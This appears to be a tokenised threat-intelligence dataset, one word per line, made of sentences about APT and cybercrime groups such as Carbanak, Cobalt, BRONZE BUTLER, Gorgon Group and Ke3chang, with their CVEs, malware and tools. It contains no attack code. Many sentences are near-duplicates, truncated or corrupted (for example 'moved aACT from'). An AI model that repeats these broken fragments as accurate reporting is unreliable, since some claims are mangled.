BlackOasis
group
was
exploiting
a
Adobe
Flash
Player
zero-day
vulnerability
(
CVE-2016-4117
)
to
remotely
deliver
the
latest
version
of
"
FinSpy
"
malware
,
according
to
a
new
blog
post
published
Monday
.
 
Kaspersky
found
the
group
was
exploiting
a
Adobe
Flash
Player
zero-day
vulnerability
(
CVE-2016-4117
)
to
remotely
deliver
the
latest
version
of
"
FinSpy
"
malware
,
according
to
a
new
blog
post
published
Monday
.
 
BlackOasis
'
interests
span
a
wide
gamut
of
figures
involved
in
Middle
Eastern
politics
.
 
REDBALDKNIGHT
,
also
known
as
BRONZE
BUTLER
and
Tick
,
is
a
cyberespionage
group
known
to
target
Japanese
organizations
such
as
government
agencies
(
including
defense
)
as
well
as
those
in
biotechnology
,
electronics
manufacturing
,
and
industrial
chemistry
.
 
REDBALDKNIGHT
,
also
known
as
BRONZE
BUTLER
and
Tick
,
is
a
cyberespionage
group
known
to
target
Japan
such
as
government
agencies
as
well
as
those
in
biotechnology
,
electronics
manufacturing
,
and
industrial
chemistry
.
 
In
fact
,
REDBALDKNIGHT
has
been
targeting
Japan
as
early
as
2008
,
based
on
the
file
properties
of
the
decoy
documents
they've
been
sending
to
their
targets
.
 
In
fact
,
REDBALDKNIGHT
has
been
zeroing
in
on
Japanese
organizations
as
early
as
2008
at
least
based
on
the
file
properties
of
the
decoy
documents
they've
been
sending
to
their
targets
.
 
Secureworks
incident
responders
and
Counter
Threat
Unit
(
CTU
)
researchers
investigated
activities
associated
with
the
BRONZE
BUTLER
(
also
known
as
Tick
)
threat
group
,
which
likely
originates
in
the
People
.
 
Targeting
data
supports
the
belief
that
APT39
's
key
mission
is
to
track
or
monitor
targets
of
interest
,
collect
personal
information
,
including
travel
itineraries
,
and
gather
customer
data
from
telecommunications
firms
.
 
BRONZE
BUTLER
has
used
a
broad
range
of
publicly
available
(
Mimikatz
and
gsecdump
)
and
proprietary
(
Daserf
and
Datper
)
tools
.
 
BRONZE
BUTLER
are
also
fluent
in
Japanese
,
crafting
phishing
emails
in
native
Japanese
and
operating
successfully
within
a
Japanese-language
environment
.
 
BRONZE
BUTLER
has
demonstrated
the
ability
to
identify
a
significant
zero-day
vulnerability
within
a
popular
Japanese
corporate
tool
and
then
use
scan-and-exploit
techniques
to
indiscriminately
compromise
Japanese
Internet-facing
enterprise
systems
.
 
The
group
has
demonstrated
the
ability
to
identify
a
significant
zero-day
vulnerability
within
a
popular
Japanese
corporate
tool
and
then
use
scan-and-exploit
techniques
to
indiscriminately
compromise
Japanese
Internet-facing
enterprise
systems
.
 
BRONZE
BUTLER
has
used
phishing
emails
with
Flash
animation
attachments
to
download
and
execute
Daserf
malware
,
and
has
also
leveraged
Flash
exploits
for
SWC
attacks
.
 
The
group
has
used
phishing
emails
with
Flash
animation
attachments
to
download
and
execute
Daserf
malware
,
and
has
also
leveraged
Flash
exploits
for
SWC
attacks
.
 
BRONZE
BUTLER
uses
credential
theft
tools
such
as
Mimikatz
and
WCE
to
steal
authentication
information
from
the
memory
of
compromised
hosts
.
 
While
investigating
a
2016
intrusion
,
Secureworks
identified
BRONZE
BUTLER
exploiting
a
then-unpatched
remote
code
execution
vulnerability
(
CVE-2016-7836
)
in
SKYSEA
Client
View
,
a
popular
Japanese
product
used
to
manage
an
organization
.
 
While
investigating
a
2016
intrusion
,
Secureworks
incident
responders
identified
BRONZE
BUTLER
exploiting
a
then-unpatched
remote
code
execution
vulnerability
(
CVE-2016-7836
)
in
SKYSEA
Client
View
,
a
popular
Japanese
product
used
to
manage
an
organization
.
 
Several
xxmm
samples
analyzed
by
CTU
researchers
incorporate
Mimikatz
,
allowing
BRONZE
BUTLER
to
issue
Mimikatz
commands
directly
from
xxmm
.
 
BRONZE
BUTLER
compromises
organizations
to
conduct
cyberespionage
,
primarily
focusing
on
Japan
.
 
Symantec
discovered
the
most
recent
wave
of
Tick
attacks
in
July
2015
,
when
the
group
compromised
three
different
Japanese
websites
with
a
Flash
(
.swf
)
exploit
to
mount
watering
hole
attacks
.
 
Carbanak
is
a
remote
backdoor
(
initially
based
on
Carberp
)
,
designed
for
espionage
,
data
Exfiltration
and
to
provide
remote
access
to
infected
machines
.
 
Symantec
discovered
the
most
recent
wave
of
Tick
attacks
in
July
2015
,
when
BRONZE
BUTLER
compromised
three
different
Japanese
websites
with
a
Flash
(
.swf
)
exploit
to
mount
watering
hole
attacks
.
 
In
some
cases
,
the
attackers
used
the
Society
for
Worldwide
Interbank
Financial
Telecommunication
(
SWIFT
)
network
to
transfer
money
to
their
accounts
.
 
Carbanak
is
a
backdoor
used
by
the
attackers
to
compromise
the
victim
.
 
If
found
on
the
target
system
,
Carbanak
will
try
to
exploit
a
known
vulnerability
in
Windows
XP
,
Windows
Server
2003
,
Windows
Vista
,
Windows
Server
2008
,
Windows
7
,
Windows
8
,
and
Windows
Server
2012
,
CVE-2013-3660
,
for
local
privilege
escalation
.
 
To
enable
connections
to
the
infected
computer
using
the
Remote
Desktop
Protocol
(
RDP
)
,
Carbanak
sets
Termservice
service
execution
mode
to
Auto
.
 
Carbanak
is
also
aware
of
the
IFOBS
banking
application
and
can
,
on
command
,
substitute
the
details
of
payment
documents
in
the
IFOBS
system
.
 
Sensitive
bank
documents
have
be
found
on
the
servers
that
were
controlling
Carbanak
.
 
Existing
telemetry
indicates
that
the
Carbanak
attackers
are
trying
to
expand
operations
to
other
Baltic
and
Central
Europe
countries
,
the
Middle
East
,
Asia
and
Africa
.
 
FIN7
is
a
financially-motivated
threat
group
that
has
been
associated
with
malicious
operations
dating
back
to
late
2015
.
 
As
with
previous
campaigns
,
and
as
highlighted
in
our
annual
M-Trends
2017
report
,
FIN7
is
calling
stores
at
targeted
organizations
to
ensure
they
received
the
email
and
attempting
to
walk
them
through
the
infection
process
.
 
We
believe
that
the
Carbanak
campaign
is
a
clear
indicator
of
a
new
era
in
cybercrime
in
which
criminals
use
APT
techniques
directly
against
the
financial
industry
instead
of
through
its
customers
.
 
While
FIN7
has
embedded
VBE
as
OLE
objects
for
over
a
year
,
they
continue
to
update
their
script
launching
mechanisms
.
 
This
report
describes
the
details
and
type
of
operations
carried
out
by
Carbanak
that
focuses
on
financial
industry
,
such
as
payment
providers
,
retail
industry
and
PR
companies
.
 
Carbanak
has
its
origin
in
more
common
financial
fraud
including
theft
from
consumer
and
corporate
bank
accounts
in
Europe
and
Russia
,
using
standard
banking
malware
,
mainly
Carberp
.
 
The
group
has
its
origin
in
more
common
financial
fraud
including
theft
from
consumer
and
corporate
bank
accounts
in
Europe
and
Russia
,
using
standard
banking
malware
,
mainly
Carberp
.
 
From
2013
Carbanak
intensified
its
activity
focused
on
banks
and
electronic
payment
systems
in
Russia
and
in
the
post-Soviet
space
.
 
Since
2013
Carbanak
has
successfully
gained
access
to
networks
of
more
than
50
banks
and
5
payment
systems
.
 
The
first
successful
bank
robbery
was
committed
by
this
group
in
January
2013
.
 
To
reduce
the
risk
of
losing
access
to
the
internal
bank
network
,
the
Carbanak
,
in
addition
to
malicious
programs
,
also
used
for
remote
access
legitimate
programs
such
as
Ammy
Admin
and
Team
Viewer
.
 
We
have
no
evidence
of
compromises
against
banks
in
Western
Europe
or
United
States
,
but
it
should
be
noted
that
the
attackers
methods
could
be
utilized
against
banks
outside
of
Russia
as
well
.
 
Additionally
the
reports
on
Carbanak
show
a
different
picture
,
where
banks
targeted
outside
of
Russia
,
specifically
Europe
,
USA
and
Japan
are
mentioned
,
which
does
not
match
our
research
.
 
Without
any
insight
into
the
evidence
Kaspersky
has
obtained
,
we
can
only
repeat
our
view
that
Anunak
has
targeted
only
banks
in
Russia
and
we
have
no
concrete
reports
of
compromised
banks
outside
of
Russia
directly
related
to
this
criminal
group
.
 
Charming
Kitten
is
an
Iranian
cyberespionage
group
operating
since
approximately
2014
.
 
These
attacks
have
included
criminal
groups
responsible
for
the
delivery
of
NewPosThings
,
MalumPOS
and
PoSeidon
point
of
sale
Malware
,
as
well
as
Carbanak
from
the
Russian
criminal
organization
we
track
as
Carbon
Spider
.
 
The
Charming
Kitten'
focus
appears
to
be
individuals
of
interest
to
Iran
in
the
fields
of
academic
research
.
 
Sometimes
,
they
aim
at
establishing
a
foothold
on
the
target
's
computer
to
gain
access
into
their
organization
,
but
,
based
on
our
data
,
this
is
usually
not
their
main
objective
,
as
opposed
to
other
Iranian
threat
groups
,
such
as
OilRig
and
CopyKittens
.
 
Flying
Kitten
(
which
is
another
name
given
by
the
security
industry
to
Charming
Kitten
)
was
one
of
the
first
groups
to
be
described
as
a
coherent
threat
actor
conducting
operations
against
political
opponents
of
the
IRI
(
Islamic
Republic
of
Iran
)
government
and
foreign
espionage
targets
.
 
Flying
Kitten
was
one
of
the
first
groups
to
be
described
as
a
coherent
threat
actor
conducting
operations
against
political
opponents
of
government
and
foreign
espionage
targets
.
 
At
certain
times
,
Mesri
has
been
a
member
of
an
Iran-based
hacking
group
called
the
Turk
Black
Hat
security
team
"
.
 
During
intense
intelligence
gathering
over
the
last
24
months
,
we
observed
the
technical
capabilities
of
the
Operation
Cleaver
team
rapidly
evolve
faster
than
any
previously
observed
Iranian
effort
.
 
TinyZBot
is
a
bot
written
in
C#
and
developed
by
the
Cleaver
team
.
 
Some
of
the
teams
publicly
known
today
include
Iranian
Cyber
Army
,
Ashiyane
,
Islamic
Cyber
Resistance
Group
,
Izz
ad-Din
al-Qassam
Cyber
Fighters
,
Parastoo
,
Shabgard
,
Iran
Black
Hats
and
many
others
9
.
 
However
,
even
though
the
TTPs
of
the
Cleaver
team
have
some
overlap
to
techniques
used
by
Iranian
Cyber
Army
,
Ashiyane
(
SQL
injection
)
and
Syrian
Electronic
Army
(
phishing
)
,
we
believe
this
is
largely
the
work
of
a
new
team
.
 
The
Cobalt
group
's
traditional
"
stomping
grounds
"
are
the
Eastern
Europe
,
Central
Asia
,
and
Southeast
Asia
.
 
Against
targets
in
the
CIS
countries
,
the
Cobalt
also
used
their
own
infrastructure
,
which
included
rented
dedicated
servers
.
 
In
several
cases
,
the
Cobalt
compromised
company
infrastructure
and
employee
accounts
in
order
to
send
phishing
messages
to
partner
companies
in
North
and
South
America
,
Europe
,
CIS
countries
,
and
Central
and
Southeast
Asia
.
 
To
ensure
remote
access
to
the
workstation
of
an
employee
at
a
target
organization
,
the
Cobalt
group
(
as
in
previous
years
)
uses
Beacon
,
a
Trojan
available
as
part
of
commercial
penetration
testing
software
.
 
Artifacts
indicated
the
involvement
of
the
Cobalt
that
,
according
to
Positive
Technologies
information
,
from
August
to
October
had
performed
similar
successful
attacks
in
Eastern
Europe
,
and
it
's
likely
that
this
group
may
will
soon
become
active
in
the
West
.
 
In
a
recent
spear-phishing
campaign
,
the
Cobalt
Hacking
Group
used
a
remote
code
execution
vulnerability
in
Microsoft
Office
software
to
connect
to
its
command
and
control
server
via
Cobalt
Strike
.
 
The
basic
principles
of
targeted
attacks
on
financial
institutions
have
not
changed
since
2013
when
the
Anunak
,
Corkow
,
Buhtrap
,
and
Lurk
groups
began
conducting
the
first
attacks
on
Russian
banks
.
 
In
a
recent
spear-phishing
campaign
,
the
Cobalt
Group
used
a
known
CVE
to
connect
to
its
C&C
server
via
Cobalt
Strike
,
but
ended
up
revealing
all
targets
.
 
This
isn't
the
first
time
we've
seen
Cobalt
makes
this
errorback
in
March
,
an
attack
focussing
on
1,880
targets
across
financial
institutions
in
Kazakhstan
had
the
same
flaw
.
 
The
Carbanak
attacks
targeting
over
a
100
financial
institutions
worldwide
.
 
The
leader
of
the
crime
gang
behind
the
Carbanak
and
Cobalt
malware
attacks
targeting
over
a
100
financial
institutions
worldwide
has
been
arrested
in
Alicante
,
Spain
,
after
a
complex
investigation
conducted
by
the
Spanish
National
Police
.
 
Since
2013
,
the
Cobalt
have
attempted
to
attack
banks
and
financial
institutions
using
pieces
of
malware
they
designed
.
 
Since
2013
,
the
cybercrime
gang
have
attempted
to
attack
banks
,
e-payment
systems
and
financial
institutions
using
pieces
of
malware
they
designed
,
known
as
Carbanak
and
Cobalt
.
 
The
organised
crime
group
started
its
high-tech
criminal
activities
in
late
2013
by
launching
the
Anunak
malware
campaign
that
targeted
financial
transfers
and
ATM
networks
of
financial
institutions
around
the
world
.
 
One
of
the
Cobalt
Group
's
latest
campaigns
,
an
attack
that
leads
to
a
Cobalt
Strike
beacon
and
to
JavaScript
backdoor
,
was
investigated
and
presented
by
the
Talos
research
team
.
 
The
Cobalt
started
its
high-tech
criminal
activities
in
late
2013
by
launching
the
Anunak
malware
campaign
that
targeted
financial
transfers
and
ATM
networks
of
financial
institutions
around
the
world
.
 
The
Cobalt
group
misused
Cobalt
Strike
,
for
instance
,
to
perpetrate
ATM
cyber
heists
and
target
financial
institutions
across
Europe
,
and
interestingly
,
Russia
.
 
The
hacking
group
misused
Cobalt
Strike
,
for
instance
,
to
perpetrate
ATM
cyber
heists
and
target
financial
institutions
across
Europe
,
and
interestingly
,
Russia
.
 
If
successful
,
Cobalt
goes
on
to
attack
financial
institutions
outside
the
country
.
 
The
vulnerability
was
used
to
retrieve
and
execute
Cobalt
Strike
from
a
remote
server
they
controlled
.
 
As
part
of
our
monitoring
of
Iranian
threat
agents
activities
,
we
have
detected
that
since
October
2016
and
until
the
end
of
January
2017
,
the
Jerusalem
Post
,
as
well
as
multiple
other
Israeli
websites
and
one
website
in
the
Palestinian
Authority
were
compromised
by
Iranian
threat
agent
CopyKittens
.
 
CopyKittens
use
several
self-developed
malware
and
hacking
tools
that
have
not
been
publicly
reported
to
date
,
and
are
analyzed
in
this
report
:
TDTESS
backdoor
;
Vminst
,
a
lateral
movement
tool
;
NetSrv
,
a
Cobalt
Strike
loader
;
and
ZPP
,
a
files
compression
console
program
.
 
CopyKittens
often
uses
the
trial
version
of
Cobalt
Strike
,
a
publicly
available
commercial
software
for
"
Adversary
Simulations
and
Red
Team
Operations
"
.
 
Other
public
tools
used
by
the
CopyKittens
are
Metasploit
,
a
well-known
free
and
open
source
framework
for
developing
and
executing
exploit
code
against
a
remote
target
machine
;
Mimikatz
,
a
post-exploitation
tool
that
performs
credential
dumping
;
and
Empire
,
a
PowerShell
and
Python
post-exploitation
agent
.
 
The
group
,
which
we
have
given
the
name
Gallmaker
,
has
been
operating
since
at
least
December
2017
,
with
its
most
recent
activity
observed
in
June
2018
.
 
Rather
,
the
Gallmaker
's
attack
activity
we
observed
is
carried
out
exclusively
using
LotL
tactics
and
publicly
available
hack
tools
.
 
Gallmaker
used
lure
documents
attempt
to
exploit
the
Microsoft
Office
Dynamic
Data
Exchange
(
DDE
)
protocol
in
order
to
gain
access
to
victim
machines
.
 
Should
a
user
enable
this
content
,
the
attackers
are
then
able
to
use
the
DDE
protocol
to
remotely
execute
commands
in
memory
on
the
victim
's
system
.
 
Back
in
2013
,
CopyKittens
used
several
Facebook
profiles
to
spread
links
to
a
website
impersonating
Haaretz
news
,
an
Israeli
newspaper
.
 
Gallmaker
's
activity
appears
to
be
highly
targeted
,
with
its
victims
all
related
to
government
,
military
,
or
defense
sectors
.
 
Gallmaker
's
targets
are
embassies
of
an
Eastern
European
country
.
 
There
are
no
obvious
links
between
the
Eastern
European
and
Middle
Eastern
targets
,
but
it
is
clear
that
Gallmaker
is
specifically
targeting
the
defense
,
military
,
and
government
sectors
.
 
The
group
has
carried
out
attacks
most
months
since
December
2017
.
 
Its
activity
subsequently
increased
in
the
second
quarter
of
2018
,
with
a
particular
spike
in
April
2018
.
 
The
fact
that
Gallmaker
appears
to
rely
exclusively
on
LotL
tactics
and
publicly
available
hack
tools
makes
its
activities
extremely
hard
to
detect
.
 
The
Gamaredon
Group
primarily
makes
use
of
compromised
domains
,
dynamic
DNS
providers
,
Russian
and
Ukrainian
country
code
top-level
domains
(
ccTLDs
)
,
and
Russian
hosting
providers
to
distribute
their
custom-built
malware
.
 
Gallmaker
may
well
have
continued
to
avoid
detection
were
it
not
for
Symantec
's
technology
.
 
In
this
instance
,
Symantec
identified
the
specific
PowerShell
commands
used
by
Gallmaker
as
being
suspicious
,
leading
to
the
discovery
of
this
new
campaign
.
 
Without
Symantec
's
advanced
AI-based
capabilities
,
Gallmaker
's
activities
may
well
have
remained
undetected
.
 
Previously
,
LookingGlass
reported
on
a
campaign
they
named
"
Operation
Armageddon
"
,
targeting
individuals
involved
in
the
Ukrainian
military
and
national
security
establishment
.
 
The
earliest
discovered
sample
(
based
on
compile
times
and
sandbox
submission
times
)
distributed
by
this
threat
group
resembles
the
descriptions
of
Gamaredon
provided
by
Symantec
and
Trend
Micro
.
 
The
scripts
would
also
use
wget
to
send
POST
requests
to
command
and
control
(
C2
)
servers
that
would
contain
information
about
the
compromised
system
.
 
These
VNC
exectuables
would
either
be
included
in
the
SFX
file
or
downloaded
by
the
batch
script
.
 
The
batch
script
would
then
attempt
to
have
the
VNC
program
connect
to
a
command
and
control
(
C2
)
server
to
enable
the
server
to
control
the
compromised
system
.
 
While
the
most
recent
samples
observed
still
use
batch
scripts
and
SFX
files
,
the
Gamaredon
Group
has
moved
aACT
from
applications
like
wget
,
Remote
Manipulator
MAL
,
VNC
and
ChkFlsh.exe
.
 
The
threat
group
using
these
implants
has
been
active
since
at
least
2014
and
has
been
seen
targeting
individuals
likely
involved
in
the
Ukrainian
government
.
 
Some
of
the
samples
share
delivery
mechanisms
and
infrastructure
with
samples
which
are
detected
by
a
few
antivirus
vendors
as
Gamaredon
.
 
Periodically
,
researchers
at
Palo
Alto
Networks
hunt
through
WildFire
execution
reports
,
using
AutoFocus
,
to
identify
untagged
samples
'
artifacts
in
the
hopes
of
identifying
previously
undiscovered
malware
families
,
behaviors
,
and
campaigns
.
 
Just
a
few
months
later
,
in
February
2015
,
we
announced
the
discovery
of
Carbanak
,
a
cyber-criminal
gang
that
used
custom
malware
and
APT
techniques
to
steal
millions
of
dollars
while
infecting
hundreds
of
financial
institutions
in
at
least
30
countries
.
 
Today
at
the
Security
Analyst
Summit
(
SAS
2016
)
,
Kaspersky
Lab
is
announcing
the
discovery
of
two
new
gangs
engaged
in
APT-style
bank
robberies
Metel
and
GCMAN
and
the
reemergence
of
the
Carbanak
group
with
new
targets
in
its
sights
.
 
In
2015
,
Kaspersky
Lab
researchers
conducted
Incident
Response
for
29
organizations
located
in
Russia
and
infected
by
these
three
groups
.
 
Kaspersky
Lab
is
releasing
crucial
Indicators
of
Compromise
(
IOCs
)
and
other
data
to
help
organizations
search
for
traces
of
these
attack
groups
in
their
corporate
networks
.
 
In
all
,
Kaspersky
Lab
discovered
Metel
in
more
than
30
financial
institutions
.
 
It
is
highly
likely
that
this
threat
is
far
more
widespread
and
we
urge
financial
institutions
around
the
world
to
scan
their
networks
for
signs
of
the
Metel
malware
.
 
A
second
group
,
which
we
call
GCMAN
because
the
malware
is
based
on
code
compiled
on
the
GCC
compiler
,
emerged
recently
using
similar
techniques
to
the
Metel
Group
to
infect
banking
institutions
and
attempt
to
transfer
money
to
e-currency
services
.
 
Our
investigations
revealed
that
the
attackers
drove
around
several
cities
in
Russia
,
stealing
money
from
ATMs
belonging
to
different
banks
.
 
Once
inside
the
network
,
the
GCMAN
group
uses
legitimate
and
penetration
testing
tools
such
as
Putty
,
VNC
,
and
Meterpreter
for
lateral
movement
.
 
Our
investigation
revealed
an
attack
where
the
GCMAN
group
then
planted
a
cron
script
into
bank
's
server
,
sending
financial
transactions
at
the
rate
of
$200
per
minute
.
 
The
GCMAN
group
used
an
MS
SQL
injection
in
commercial
software
running
on
one
of
bank
's
public
web
services
,
and
about
a
year
and
a
half
later
,
they
came
back
to
cash
out
.
 
During
that
time
they
poked
70
internal
hosts
,
compromised
56
accounts
,
making
their
ACT
from
139
attack
sources
(
TOR
and
compromised
home
routers
)
.
 
However
,
in
September
last
year
,
our
friends
at
CSIS
published
a
blog
detailing
a
new
Carbanak
variant
affecting
one
of
its
customers
.
 
Kaspersky
Lab
's
research
team
responded
to
three
financial
institutions
in
Russia
that
were
infected
with
the
GCMAN
malware
.
 
In
one
remarkable
case
,
the
Carbanak
2.0
gang
used
its
access
to
a
financial
institution
that
stores
information
about
shareholders
to
change
the
ownership
details
of
a
large
company
.
 
Recently
Subaat
drew
our
attention
due
to
renewed
targeted
attack
activity
.
 
Technical
analysis
on
some
of
the
attacks
as
well
as
attribution
links
with
Pakistan
actors
have
been
already
depicted
by
360
and
Tuisec
,
in
which
they
found
interesting
connections
to
a
larger
group
of
attackers
Unit
42
researchers
have
been
tracking
,
which
we
are
calling
Gorgon
Group
.
 
Starting
in
February
2018
,
Palo
Alto
Networks
identified
a
campaign
of
attacks
performed
by
members
of
Gorgon
Group
targeting
governmental
organizations
in
the
United
Kingdom
,
Spain
,
Russia
,
and
the
United
States
.
 
Starting
in
February
2018
,
Palo
Alto
Networks
Unit
42
identified
a
of
attacks
performed
by
members
of
Gorgon
Group
targeting
governmental
organizations
in
the
United
Kingdom
,
Spain
,
Russia
,
and
the
United
States
.
 
The
GCMAN
group
has
moved
beyond
banks
and
is
now
targeting
the
budgeting
and
accounting
departments
in
any
organization
of
interest
to
them
,
using
the
same
APT-style
tools
and
techniques
.
 
Starting
in
February
2018
,
Unit
42
identified
a
campaign
of
attacks
performed
by
members
of
Gorgon
Group
targeting
governmental
organizations
in
the
United
Kingdom
,
Spain
,
Russia
,
and
the
United
States
.
 
APT38
's
increasingly
aggressive
targeting
against
banks
.
 
Gorgon
Group
used
common
URL
shortening
services
to
download
payloads
.
 
The
GCMAN
group
has
moved
beyond
banks
and
is
now
targeting
the
budgeting
and
accounting
departments
in
any
organization
of
interest
to
them
,
using
the
same
APT-style
tools
and
techniques
.
 
APT38
has
paralleled
North
Korea
's
worsening
financial
condition
.
 
On
much
of
the
C2
infrastructure
we
identified
several
crimeware
family
samples
.
 
While
investigating
the
domains
and
infrastructure
used
by
the
phishing
components
of
Gorgon
Group
,
Unit
42
researchers
witnessed
several
common
operational
security
flaws
with
Gorgon
Group
's
actors
throughout
their
many
campaigns
.
 
360
and
Tuisec
already
identified
some
Gorgon
Group
members
.
 
RATs
such
as
NjRat
and
infostealers
like
Lokibot
were
leveraging
the
same
C2
infrastructure
as
that
of
the
targeted
attacks
.
 
it
's
not
known
if
the
attackers
physically
reside
in
Pakistan
.
 
Gorgon
used
numerous
decoy
documents
and
phishing
emails
,
both
styles
of
attacks
lacked
overall
sophistication
.
 
While
it
's
not
known
if
the
attackers
physically
reside
in
Pakistan
,
all
members
of
Gorgon
Group
purport
to
be
in
Pakistan
based
on
their
online
personas
.
 
Starting
in
mid-February
,
Unit
42
researchers
have
been
tracking
an
active
campaign
sharing
a
significant
portion
of
infrastructure
leveraged
by
Gorgon
Group
for
criminal
and
targeted
attacks
.
 
Unit
42
researchers
have
been
tracking
Gorgon
Group
for
criminal
and
targeted
attacks
.
 
As
part
of
the
investigation
,
Unit
42
researchers
were
able
to
identify
an
interesting
characteristic
about
how
the
Gorgon
Group
crew
uses
shared
infrastructure
between
cybercrime
and
targeted
attacks
.
 
The
crew
combines
both
regular
crime
and
targeted
attack
objectives
using
the
same
domain
infrastructure
over
time
,
rarely
changing
their
TTPs
.
 
One
interesting
note
about
the
criminal
activity
of
Gorgon
Group
is
their
usage
of
Bitly
.
 
Between
April
1
,
2018
and
May
30
,
2018
,
we
observed
the
domain
stevemike-fireforce.info
used
in
a
Gorgon
Group
cybercrime
campaign
involving
more
than
2,300
emails
and
19
documents
in
the
initial
attack
.
 
Similar
to
that
of
their
targeted
attacks
,
Gorgon
Group
leveraged
Bitly
for
distribution
and
shortening
of
C2
domains
.
 
Beginning
in
early
March
2018
,
Unit
42
started
observing
targeted
attacks
against
Russian
,
Spanish
and
United
States
government
agencies
operating
in
Pakistan
.
 
Leveraging
click
counts
for
the
campaign
for
Bitly
,
we
were
able
to
see
Gorgon
Group
's
activity
volume
increase
throughout
April
.
 
As
we
continued
to
investigate
,
it
became
apparent
that
Gorgon
Group
had
been
consistently
targeting
worldwide
governmental
organizations
operating
within
Pakistan
.
 
Starting
in
mid-February
.
 
Additionally
,
during
that
time
,
members
of
Gorgon
Group
were
also
performing
criminal
operations
against
targets
across
the
globe
,
often
using
shared
infrastructure
with
their
targeted
attack
operations
.
 
Unit
42
researchers
have
been
tracking
an
active
campaign
.
 
This
Gorgon
Group
campaign
leveraged
spear
phishing
emails
with
Microsoft
Word
documents
exploiting
CVE-2017-0199
.
 
Beginning
in
early
March
2018
,
Unit
42
started
observing
Gorgon
group
attacks
against
Russian
,
Spanish
and
United
States
government
agencies
operating
in
Pakistan
.
 
Like
all
of
Gorgon
Group
's
members
,
Fudpage
's
online
profile
,
infrastructure
utilization
and
standardization
,
connects
them
back
to
Gorgon
Group
.
 
Ultimately
,
this
lead
us
to
the
conclusion
that
several
of
Gorgon
Group
's
members
have
a
nexus
in
Pakistan
.
 
Gorgon
Group
isn't
the
first
actor
group
we've
witnessed
dabble
in
both
nation
state
level
and
criminal
attacks
.
 
Overall
,
in
spite
of
the
lack
of
sophistication
in
Gorgon
Group
's
activity
,
they
were
still
relatively
successful
;
once
again
proving
that
simple
attacks
on
individuals
without
proper
protections
,
work
.
 
On
January
15
,
Advanced
Threat
Research
discovered
an
operation
using
a
new
variant
of
the
SYSCON
backdoor
.
 
The
Korean-language
Word
document
manual.doc
appeared
in
Vietnam
on
January
17
,
with
the
original
author
name
of
Honeybee
.
 
While
Gorgon
Group
has
been
making
minor
changes
in
their
methodologies
,
they
are
still
actively
involved
in
both
targeted
and
criminal
attacks
.
 
This
malicious
document
contains
a
Visual
Basic
macro
that
dropped
and
executed
an
upgraded
version
of
the
implant
known
as
SYSCON
,
which
appeared
in
2017
in
malicious
Word
documents
as
part
of
several
campaigns
using
North
Korearelated
topics
.
 
This
key
was
also
used
in
the
Honeybee
campaign
and
appears
to
have
been
used
since
August
2017
.
 
Several
additional
documents
surfaced
between
January
17
and
February
3
.
 
All
contain
the
same
Visual
Basic
macro
code
and
author
name
as
Honeybee
.
 
Some
of
the
malicious
documents
were
test
files
without
the
implant
.
 
From
our
analysis
,
Honeybee
submitted
most
of
these
documents
from
South
Korea
,
indicating
that
some
of
the
targeting
was
in
South
Korea
.
 
Honeybee
attacked
beyond
the
borders
of
South
Korea
to
target
Vietnam
,
Singapore
,
Argentina
,
Japan
,
Indonesia
,
and
Canada
.
 
Honeybee
appears
to
target
humanitarian
aid
and
inter-Korean
affairs
.
 
McAfee
Advanced
Threat
Research
team
's
analysis
,
we
find
multiple
components
from
this
operation
are
unique
from
a
code
perspective
,
even
though
the
code
is
loosely
based
on
previous
versions
of
the
SYSCON
backdoor
.
 
Large-scale
cyber
espionage
campaigns
such
as
"
GhostNet
"
.
 
As
the
crisis
in
Syria
escalates
,
FireEye
researchers
have
discovered
a
cyber
espionage
campaign
,
which
we
call
"
Ke3chang
"
,
that
falsely
advertises
information
updates
about
the
ongoing
crisis
to
compromise
MFA
networks
in
Europe
.
 
As
the
crisis
in
Syria
escalates
,
FireEye
researchers
have
discovered
a
threat
group
,
which
we
call
"
Ke3chang
"
,
that
falsely
advertises
information
updates
about
the
ongoing
crisis
to
compromise
MFA
networks
in
Europe
.
 
We
believe
that
the
Ke3chang
attackers
are
operating
out
of
China
and
have
been
active
since
at
least
2010
.
 
FireEye
gained
visibility
into
one
of
23
known
command-and-control
(
CnC
)
servers
operated
by
the
Ke3chang
actor
for
about
one
week
.
 
Each
attack
comprises
a
variety
of
phases
,
including
reconnaissance
,
exploitation
,
command
and
control
,
lateral
movement
,
and
Exfiltration
.
 
The
Ke3chang
attackers
have
been
active
since
at
least
2010
.
 
traditionally
targeted
the
aerospace
,
energy
,
government
,
high-tech
,
consulting
services
,
and
chemicals
/
manufacturing
/
mining
sectors
.
 
The
Ke3chang
have
used
three
types
of
malware
over
the
years
and
have
traditionally
targeted
the
aerospace
,
energy
,
government
,
high-tech
,
consulting
services
,
chemicals
,
manufacturing
,
mining
sectors
.
 
August
2013
,
FireEye
gained
visibility
on
one
of
22
CnC
servers
used
at
that
time
by
the
Ke3chang
attackers
.
 
In
this
report
,
we
present
the
historical
intelligence
we
have
gathered
on
the
Ke3chang
campaign
,
as
well
as
an
in-depth
assessment
of
the
ongoing
Syrian-themed
attacks
against
these
MFAs
.
 
Ke3chang
attackers
have
used
spear-phishing
emails
.
 
Ke3chang
has
also
leveraged
a
Java
zero-day
vulnerability
(
CVE-2012-4681
)
,
as
well
as
older
,
reliable
exploits
for
Microsoft
Word
(
CVE-2010-3333
)
and
Adobe
PDF
Reader
(
CVE-2010-2883
)
.
 
Traditionally
,
the
Ke3chang
attackers
have
used
spear-phishing
emails
with
either
a
malware
attachment
or
a
link
to
a
malicious
download
.
 
Over
the
years
,
the
Ke3chang
attackers
have
used
three
types
of
malware
that
we
call
:
"
BS2005
"
,
"
BMW
"
,
and
"
MyWeb
"
.
 
it
is
a
typical
first
stage
backdoor
commonly
found
in
APT
attacks
.
 
The
attackers
have
used
three
types
of
malware
over
the
years
and
have
traditionally
targeted
the
aerospace
,
energy
,
government
,
high-tech
,
consulting
services
,
and
chemicals
/
manufacturing
/
mining
sectors
.
 
All
of
the
CnC
communications
are
performed
over
the
HTTP
protocol
.
 
The
current
Ke3chang
campaign
leverages
the
BS2005
malware
,
while
older
activity
from
2010
-
2011
leveraged
BMW
,
followed
by
the
MyWeb
malware
sporadically
used
in
between
.
 
A
trait
common
to
all
three
malware
families
we
analyzed
is
that
they
use
the
IWebBrowser2
COM
interface
to
perform
their
CnC
communication
.
 
Three
months
after
the
Olympics-themed
attacks
,
FireEye
observed
a
new
BS2005
campaign
labeled
"
newtiger
"
,
which
is
possibly
a
reference
to
an
older
2010
campaign
labeled
"
tiger
"
.
 
Using
information
from
the
FireEye
DTI
cloud
,
FireEye
observed
that
Ke3chang
targeted
a
single
firm
.
 
The
Ke3chang
attackers
used
the
older
"
